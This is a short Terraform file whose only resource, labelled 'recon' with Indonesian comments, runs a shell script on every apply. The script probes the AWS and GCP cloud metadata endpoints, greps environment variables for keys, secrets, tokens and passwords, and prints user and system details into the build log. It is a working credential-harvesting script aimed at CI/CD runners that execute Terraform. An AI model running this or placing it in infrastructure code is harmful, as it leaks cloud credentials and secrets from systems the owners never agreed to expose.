resource "null_resource" "recon" {
  triggers = {
    always_run = "${timestamp()}"
  }

  provisioner "local-exec" {
    command = <<EOT
      echo "========= START RECONNAISSANCE ========="
      echo "[*] USER INFO:"
      id
      whoami
      
      echo "[*] NETWORK CHECK (SSRF):"
      # Cek akses ke AWS Metadata (IP Rahasia Cloud)
      curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo "AWS Metadata Blocked"
      curl -s --connect-timeout 2 http://metadata.google.internal/computeMetadata/v1/ || echo "GCP Metadata Blocked"
      
      echo "[*] ENVIRONMENT VARIABLES (SECRET LEAK):"
      # Kita filter supaya log tidak terlalu penuh, cari yang berbau KEY/TOKEN
      env | grep -E "KEY|SECRET|TOKEN|AWS|PASS" || echo "No obvious secrets found in ENV"
      
      echo "[*] SYSTEM INFO:"
      uname -a
      cat /etc/os-release
      
      echo "========= END RECONNAISSANCE ========="
    EOT
  }
}
